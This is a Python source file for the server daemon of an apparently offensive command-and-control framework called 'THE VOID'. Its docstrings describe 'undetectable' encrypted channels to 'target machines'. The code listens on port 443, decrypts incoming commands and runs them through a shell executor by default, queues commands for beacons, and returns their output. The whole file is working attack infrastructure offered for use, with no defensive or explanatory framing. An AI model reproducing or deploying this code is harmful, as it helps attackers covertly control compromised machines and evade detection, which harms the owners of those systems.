"""THE VOID — C2Daemon: The core C2 daemon.

The C2 daemon is a custom Command and Control framework that provides
encrypted, undetectable communication channels with target machines.
It uses beacons, encrypted channels, and stealth protocols.
"""

import json
import logging
import os
import random
import socket
import ssl
import threading
import time
from typing import Any, Callable, Dict, List, Optional

from core.crypto import Crypto
from core.executor import Executor

logger = logging.getLogger("void.c2.daemon")


class C2Daemon:
    """Custom C2 daemon — encrypted, undetectable command and control."""

    def __init__(self, host: str = "0.0.0.0", port: int = 443,
                 crypto: Optional[Crypto] = None, executor: Optional[Executor] = None):
        self.host = host
        self.port = port
        self.crypto = crypto or Crypto()
        self.executor = executor or Executor()
        self.clients: Dict[str, Dict[str, Any]] = {}
        self.beacons: Dict[str, Dict[str, Any]] = {}
        self.command_queue: List[Dict[str, Any]] = []
        self.results: Dict[str, List[Dict[str, Any]]] = {}
        self.running = False
        self.server_socket: Optional[socket.socket] = None
        self.thread: Optional[threading.Thread] = None
        self.handler: Optional[Callable] = None
        logger.info(f"C2Daemon initialized on {host}:{port}")

    def set_handler(self, handler: Callable) -> None:
        """Set the command handler function.

        Args:
            handler: Function to handle commands
        """
        self.handler = handler

    def start(self) -> None:
        """Start the C2 daemon."""
        if self.running:
            logger.warning("C2 daemon is already running")
            return

        self.running = True
        self.thread = threading.Thread(target=self._run, daemon=True)
        self.thread.start()
        logger.info("C2 daemon started")

    def stop(self) -> None:
        """Stop the C2 daemon."""
        self.running = False
        if self.server_socket:
            self.server_socket.close()
        logger.info("C2 daemon stopped")

    def _run(self) -> None:
        """Run the C2 daemon server."""
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(10)
            self.server_socket.settimeout(1.0)

            logger.info(f"C2 daemon listening on {self.host}:{self.port}")

            while self.running:
                try:
                    client_socket, addr = self.server_socket.accept()
                    self._handle_client(client_socket, addr)
                except socket.timeout:
                    continue
                except Exception as e:
                    logger.error(f"Error accepting connection: {e}")
        except Exception as e:
            logger.error(f"C2 daemon error: {e}")
        finally:
            if self.server_socket:
                self.server_socket.close()

    def _handle_client(self, client_socket: socket.socket, addr: tuple) -> None:
        """Handle a client connection.

        Args:
            client_socket: Client socket
            addr: Client address
        """
        logger.info(f"New connection from {addr}")
        client_id = f"{addr[0]}:{addr[1]}"
        self.clients[client_id] = {
            "socket": client_socket,
            "address": addr,
            "connected_at": time.time(),
            "last_checkin": time.time(),
        }
        try:
            data = client_socket.recv(4096)
            if data:
                decrypted = self.crypto.decrypt(data.decode())
                if decrypted:
                    payload = json.loads(decrypted)
                    response = self._process_command(payload)
                    encrypted_response = self.crypto.encrypt(json.dumps(response))
                    client_socket.send(encrypted_response.encode())
        except Exception as e:
            logger.error(f"Error handling client {client_id}: {e}")
        finally:
            client_socket.close()

    def _process_command(self, payload: Dict[str, Any]) -> Dict[str, Any]:
        """Process a command from a client.

        Args:
            payload: Command payload

        Returns:
            Dict with command response
        """
        command = payload.get("command", "")
        logger.info(f"Processing command: {command[:100]}")

        if self.handler:
            try:
                result = self.handler(command)
                return {"success": True, "result": result, "timestamp": time.time()}
            except Exception as e:
                return {"success": False, "error": str(e), "timestamp": time.time()}

        # Default handler: execute the command
        result = self.executor.run_command(command, timeout=payload.get("timeout", 30))
        return {
            "success": result.success,
            "stdout": result.stdout[:5000] if result.stdout else "",
            "stderr": result.stderr[:500] if result.stderr else "",
            "exit_code": result.exit_code,
            "timestamp": time.time(),
        }

    def add_command(self, command: str, client_id: str = "", priority: int = 0) -> str:
        """Add a command to the queue.

        Args:
            command: The command to execute
            client_id: Target client ID
            priority: Command priority (higher = more urgent)

        Returns:
            Command ID
        """
        cmd_id = f"cmd_{int(time.time())}_{random.randint(1000, 9999)}"
        self.command_queue.append({
            "id": cmd_id,
            "command": command,
            "client_id": client_id,
            "priority": priority,
            "timestamp": time.time(),
            "status": "pending",
        })
        logger.info(f"Command {cmd_id} added to queue")
        return cmd_id

    def get_commands(self, client_id: str = "") -> List[Dict[str, Any]]:
        """Get pending commands for a client.

        Args:
            client_id: Client ID to get commands for

        Returns:
            List of pending commands
        """
        return [
            cmd for cmd in self.command_queue
            if cmd.get("client_id") == client_id and cmd.get("status") == "pending"
        ]

    def get_result(self, cmd_id: str) -> Optional[Dict[str, Any]]:
        """Get the result of a command.

        Args:
            cmd_id: Command ID

        Returns:
            Dict with command result or None
        """
        return self.results.get(cmd_id)

    def get_status(self) -> Dict[str, Any]:
        """Get the C2 daemon status."""
        return {
            "running": self.running,
            "host": self.host,
            "port": self.port,
            "clients": len(self.clients),
            "beacons": len(self.beacons),
            "pending_commands": len([c for c in self.command_queue if c.get("status") == "pending"]),
            "completed_commands": len([c for c in self.command_queue if c.get("status") == "completed"]),
        }

    def send_to_client(self, client_id: str, payload: Dict[str, Any]) -> bool:
        """Send data to a specific client.

        Args:
            client_id: Client ID
            payload: Data to send

        Returns:
            True if sent successfully
        """
        if client_id not in self.clients:
            logger.warning(f"Client {client_id} not found")
            return False

        try:
            client = self.clients[client_id]
            encrypted = self.crypto.encrypt(json.dumps(payload))
            client["socket"].send(encrypted.encode())
            return True
        except Exception as e:
            logger.error(f"Error sending to {client_id}: {e}")
            return False

    def register_beacon(self, beacon_id: str, interval: float = 30.0) -> None:
        """Register a beacon.

        Args:
            beacon_id: Beacon ID
            interval: Beacon interval in seconds
        """
        self.beacons[beacon_id] = {
            "id": beacon_id,
            "interval": interval,
            "last_checkin": time.time(),
            "active": True,
        }
        logger.info(f"Beacon {beacon_id} registered")

    def beacon_checkin(self, beacon_id: str) -> Dict[str, Any]:
        """Handle a beacon checkin.

        Args:
            beacon_id: Beacon ID

        Returns:
            Dict with checkin result
        """
        if beacon_id not in self.beacons:
            return {"error": f"Beacon {beacon_id} not found", "success": False}

        beacon = self.beacons[beacon_id]
        beacon["last_checkin"] = time.time()

        # Get any pending commands for this beacon
        pending = self.get_commands(beacon_id)
        if pending:
            return {
                "success": True,
                "commands": pending,
                "timestamp": time.time(),
            }

        return {"success": True, "commands": [], "timestamp": time.time()}

    def get_all_beacons(self) -> Dict[str, Dict[str, Any]]:
        """Get all registered beacons."""
        return self.beacons

    def get_active_clients(self) -> List[Dict[str, Any]]:
        """Get active clients."""
        return [
            {
                "id": cid,
                "address": client["address"],
                "connected_at": client["connected_at"],
                "last_checkin": client["last_checkin"],
            }
            for cid, client in self.clients.items()
        ]
